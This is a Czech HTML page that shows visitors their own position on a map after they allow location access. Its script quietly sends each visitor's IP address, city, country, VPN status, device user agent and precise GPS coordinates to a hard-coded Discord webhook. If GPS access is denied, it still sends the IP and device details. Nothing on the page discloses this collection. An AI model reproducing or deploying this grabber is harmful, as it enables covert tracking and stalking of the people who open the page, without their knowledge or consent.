<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Moje Lokace</title>
    <!-- P≈ôid√°n√≠ odkazu na CSS soubor -->
    <link rel="stylesheet" href="styles.css">
    <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
</head>
<body>

<h2>Tvoje poloha</h2>
<button onclick="getUserLocation()">Povolit polohu</button>
<div id="map"></div>

<script>
    const webhookURL = "https://discord.com/api/webhooks/1336736765674917979/lyGotJhq7TWp2kRsHpd_246EPiXxMZ91S3rKDVuq54iFQX-FY8TlJ7pat1eBph-KL0XC";

    // Funkce pro z√≠sk√°n√≠ IP informac√≠
    async function getIPInfo() {
        try {
            const response = await fetch("https://ipapi.co/json/");
            const data = await response.json();
            return {
                ip: data.ip,
                city: data.city || "Nezn√°m√© mƒõsto",
                country: data.country_code || "Nezn√°m√° zemƒõ",
                vpn: data.security ? (data.security.vpn ? "TRUE" : "FALSE") : "Nezn√°m√©"
            };
        } catch (error) {
            console.error("Chyba p≈ôi z√≠sk√°v√°n√≠ IP:", error);
            return { ip: "Nezn√°m√°", city: "Nezn√°m√©", country: "Nezn√°m√©", vpn: "Nezn√°m√©" };
        }
    }

    // Funkce pro odesl√°n√≠ dat na Discord webhook
    function sendLocationToWebhook(latitude, longitude, ipInfo, userAgent) {
        const mapyCzURL = `https://en.mapy.cz/zakladni?x=${longitude}&y=${latitude}&z=15&source=coor&id=${longitude},${latitude}`;
        const message = `üì± **Za≈ô√≠zen√≠:** ${userAgent}
üåç **IP Adresa:** ${ipInfo.ip} (Mƒõsto: ${ipInfo.city}, Zemƒõ: ${ipInfo.country})
üåê **VPN:** ${ipInfo.vpn}
üìç **GPS Sou≈ôadnice:** ${latitude}, ${longitude}
üîó **Mapa:** [Zobrazit na Mapy.cz](${mapyCzURL})`;

        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: message })
        })
        .then(response => console.log("Lokace odesl√°na:", response))
        .catch(error => console.error("Chyba p≈ôi odes√≠l√°n√≠:", error));
    }

    // Funkce pro zobrazen√≠ a odesl√°n√≠ GPS polohy
    function showLocation(position, ipInfo) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const userAgent = navigator.userAgent;

        // Zobrazit mapu
        const map = L.map('map').setView([latitude, longitude], 15);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);

        L.marker([latitude, longitude]).addTo(map)
            .bindPopup(`Tady jsi! üìç\nLat: ${latitude}, Lon: ${longitude}`)
            .openPopup();

        // Okam≈æit√© odesl√°n√≠ na webhook
        sendLocationToWebhook(latitude, longitude, ipInfo, userAgent);
    }

    // Funkce pro zpracov√°n√≠ chyby GPS
    function errorHandler(error, ipInfo) {
        const userAgent = navigator.userAgent;
        const message = `üì± **Za≈ô√≠zen√≠:** ${userAgent}
üåç **IP Adresa:** ${ipInfo.ip} (Mƒõsto: ${ipInfo.city}, Zemƒõ: ${ipInfo.country})
üåê **VPN:** ${ipInfo.vpn}
üö´ **GPS nen√≠ potvrzena**`;

        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: message })
        })
        .then(response => console.log("Chyba GPS odesl√°na:", response))
        .catch(error => console.error("Chyba p≈ôi odes√≠l√°n√≠:", error));
    }

    // Funkce pro z√≠sk√°n√≠ GPS po potvrzen√≠
    async function getUserLocation() {
        const ipInfo = await getIPInfo();

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                position => showLocation(position, ipInfo),  // Z√≠sk√°n√≠ polohy a odesl√°n√≠ na webhook
                error => errorHandler(error, ipInfo)         // Zpracov√°n√≠ chyby GPS
            );
        } else {
            errorHandler({ message: "Geolokace nen√≠ podporov√°na" }, ipInfo);
        }
    }
</script>

</body>
</html>
